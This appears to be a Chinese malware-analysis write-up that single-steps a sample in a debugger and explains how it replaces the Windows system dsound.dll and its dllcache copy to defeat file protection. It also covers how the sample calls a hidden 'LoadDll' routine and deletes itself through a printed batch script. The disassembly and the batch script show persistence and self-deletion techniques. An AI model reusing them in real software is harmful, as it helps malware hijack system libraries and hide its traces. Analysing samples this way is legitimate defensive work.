
### 单步调试过程

```
00403242  |.  59             pop     ecx
00403243  |.  8D85 4CFEFFFF lea     eax, dword ptr [ebp-1B4]
00403249  |.  50             push    eax
0040324A  |.  FFD7           call    edi                              ; kernel32.GetFileAttributesA
0040324C  |.  0C 02          or      al, 2
0040324E  |.  50             push    eax
0040324F  |.  8D85 4CFEFFFF lea     eax, dword ptr [ebp-1B4]
00403255  |.  50             push    eax
00403256  |.  FFD3           call    ebx                              ; kernel32.SetFileAttributesA
```

一路单步 `F8`，就可以了，中间过程没什么好讲的，我就直接到下面的重点了~~~

### 核心逻辑分析

```
004032A6  |.  BF 60604000    mov     edi, 00406060                  ; ASCII "dsound.dll"
004032AB  |.  50             push    eax                            ; C:\Program Files\Common Files\System\kb011595.bwb
004032AC  |.  57             push    edi                            ; dsound.dll
004032AD  |.  E8 9EF0FFFF    call    00402350                       ; 这个函数是一个非常重要的函数，我要下面重点分析一下
004032B2  |.  0FB6D8         movzx   ebx, al
004032B5  |.  59             pop     ecx
004032B6  |.  85DB           test    ebx, ebx
004032B8  |.  59             pop     ecx                            ; C:\Program Files\Common Files\System\kb011595.bwb
004032B9  |.  75 04          jnz     short 004032BF
004032BB  |>  33C0           xor     eax, eax
004032BD  |.  EB 78          jmp     short 00403337
004032BF  |>  837D D4 00     cmp     dword ptr [ebp-2C], 0
004032C3  |.  74 1C          je      short 004032E1
004032C5  |.  8D85 68F5FFFF lea     eax, dword ptr [ebp-A98]
004032CB  |.  50             push    eax
004032CC  |.  8D85 70F7FFFF lea     eax, dword ptr [ebp-890]
004032D2  |.  50             push    eax
004032D3  |.  57             push    edi
004032D4  |.  E8 12120000    call    004044EB
004032D9  |.  83C4 0C        add     esp, 0C
004032DC  |.  0FB6D8         movzx   ebx, al
004032DF  |.  EB 42          jmp     short 00403323
004032E1  |>  FF75 0C        push    dword ptr [ebp+C]
004032E4  |.  8065 CB 00     and     byte ptr [ebp-35], 0
004032E8  |.  C645 C4 4C     mov     byte ptr [ebp-3C], 4C
004032EC  |.  C645 C5 6F     mov     byte ptr [ebp-3B], 6F
004032F0  |.  C645 C6 61     mov     byte ptr [ebp-3A], 61
004032F4  |.  C645 C7 64     mov     byte ptr [ebp-39], 64
004032F8  |.  C645 C8 44     mov     byte ptr [ebp-38], 44
004032FC  |.  C645 C9 6C     mov     byte ptr [ebp-37], 6C
00403300  |.  C645 CA 6C     mov     byte ptr [ebp-36], 6C         ; LoadDll---------->重点!!!!!!!!!!!!
00403304  |.  FFD6           call    esi
00403306  |.  8D4D C4       lea     ecx, dword ptr [ebp-3C]
00403309  |.  51             push    ecx
0040330A  |.  50             push    eax
0040330B  |.  E8 10E6FFFF    call    00401920
00403310  |.  59             pop     ecx
00403311  |.  85C0           test    eax, eax
00403313  |.  59             pop     ecx
00403314  |.  74 02          je      short 00403318
00403316  |.  FFD0           call    eax                            ; LoadDll
00403318  |>  68 B80B0000    push    0BB8                           ; /Timeout = 3000. ms
0040331D  |.  FF15 0C504000  call    dword ptr [<&kernel32.Sleep>]   ; \\Sleep
00403323  |>  837D D4 00     cmp     dword ptr [ebp-2C], 0
00403327  |.  74 04          je      short 0040332D
00403329  |.  85DB           test    ebx, ebx
0040332B  |.  75 07          jnz     short 00403334
0040332D  |>  57             push    edi
0040332E  |.  E8 A40D0000    call    004040D7
```

这里调用了一个 `call 004040D7`，我们跟进~~

#### 函数 `004040D7` 分析

这个函数主要是将 `C:\windows\system32\dsound.dll` 文件拷贝到 `C:\windows\system32\dllcache\dsound.dll.LTCB`。

当操作这个文件时会触发到 Windows 文件保护机制。

![](img/59d84083ef0274d6a65eade630115be4.jpg)

然后将 `c:\windows\system32\dsound.dll.dat` 文件拷贝到 `c:\windows\system32\dllcache\dsound.dll`。

最后将 `c:\windows\system32\dsound.dll.dat` 拷贝到相同目录下的 `c:\windows\system32\dsound.dll`。

此时系统目录下的 `dsound.dll` 就是被我们替换成了新写入的数据之后的 `dsound.dll.dat` 文件的内容，嘿嘿!

### 程序清理与退出

上面这些执行完毕之后，函数返回到了 `00403730` 处，嘿嘿，前面那段代码中间的 `CALL 00402B14` 做了上面这些工作，基本上就完成了主要任务了~~

```
00403730  |.  57             push    edi                            ; /block = 003838D8
00403731  |.  FF15 74504000  call    dword ptr [<&msvcrt.free>]      ; \\free
00403737  |.  68 4C624000    push    0040624C
0040373C  |.  E8 FBFBFFFF    call    0040333C                       ----->主要是用于删除主程序
```

返回之后，我们单步执行到 `0040373C` 处就调用了一个 `CALL 0040333C`，这个 `CALL` 也很关键，因为我们可以看出后面代码执行完毕了，程序直接返回了，所以我们也要重点分析一下这个 `CALL`!

#### 函数 `0040333C` 分析

`CALL 0040333C` 这个函数主要是在临时目录下生成了一个 `tempVidio.dat` 的文件~~并在这个文件中写入如下数据：

```batch
@echo  off
:try
del  C:\DOCUME~1\jack\桌面\第一阶段\Cracker.exe
if   exist   C:\DOCUME~1\jack\桌面\第一阶段\Cracker.exe  goto  try
del  C:\DOCUME~1\jack\LOCALS~1\Temp\tempVidio.bat
```

进行自删除的工作，嘿嘿~~

### 核心替换机制

好了，上面还有一个问题没解决，就是还有一个很重要的函数没有分析~~~

`CALL 00402350`（前提是调用这个函数的时候，如果系统目录里有 `dsound.dll` 和没有 `dsound.dll` 是会有两种不同的结果）。

因为它会替换系统的 `dsound.dll`，然后在里面写入一些新的数据，目的是在系统调用这个 DLL 时，会先执行其程序，以达到某种目的~~

#### 函数 `00402350` 伪代码片段

```
00402350  /$  B8 2B494000    mov     eax, 0040492B
00402355  |.  E8 0E240000    call    00404768
0040235A  |.  81EC EC030000  sub     esp, 3EC
00402360  |.  53             push    ebx                              ; kernel32.SetFileAttributesA
00402361  |.  56             push    esi                              ; kernel32.LoadLibraryA
00402362  |.  57             push    edi                              ; dsound.dll
00402363  |.  6A 40          push    40
00402365  |.  33DB           xor     ebx, ebx                         ; ebx = 0
00402367  |.  59             pop     ecx
00402368  |.  33C0           xor     eax, eax
0040236A  |.  8DBD 09FCFFFF  lea     edi, dword ptr [ebp-3F7]
00402370  |.  889D 08FCFFFF  mov     byte ptr [ebp-3F8], bl
00402376  |.  6A 40          push    40
00402378  |.  F3:AB          rep     stos dword ptr es:[edi]
0040237A  |.  66:AB          stos    word ptr es:[edi]
0040237C  |.  AA             stos    byte ptr es:[edi]
0040237D  |.  59             pop     ecx
0040237E  |.  33C0           xor     eax, eax
00402380  |.  8DBD 0DFDFFFF  lea     edi, dword ptr [ebp-2F3]
00402386  |.  889D 0CFDFFFF  mov     byte ptr [ebp-2F4], bl
0040238C  |.  F3:AB          rep     stos dword ptr es:[edi]
0040238E  |.  66:AB          stos    word ptr es:[edi]
00402390  |.  AA             stos    byte ptr es:[edi]
00402391  |.  6A 40          push    40
00402393  |.  33C0           xor     eax, eax
00402395  |.  59             pop     ecx
00402396  |.  8DBD 11FEFFFF  lea     edi, dword ptr [ebp-1EF]
0040239C  |.  889D 10FEFFFF  mov     byte ptr [ebp-1F0], bl
004023A2  |.  C645 E4 2E     mov     byte ptr [ebp-1C], 2E
004023A6  |.  F3:AB          rep     stos dword ptr es:[edi]
004023A8  |.  66:AB          stos    word ptr es:[edi]
004023AA  |.  AA             stos    byte ptr es:[edi]
004023AB  |.  8D85 08FCFFFF  lea     eax, dword ptr [ebp-3F8]
004023B1  |.  C645 E5 64     mov     byte ptr [ebp-1B], 64
004023B5  |.  50             push    eax
004023B6  |.  C645 E6 61     mov     byte ptr [ebp-1A], 61
004023BA  |.  C645 E7 74     mov     byte ptr [ebp-19], 74            ; .dat
004023BE  |.  885D E8        mov     byte ptr [ebp-18], bl
004023C1  |.  C645 D0 43     mov     byte ptr [ebp-30], 43
```
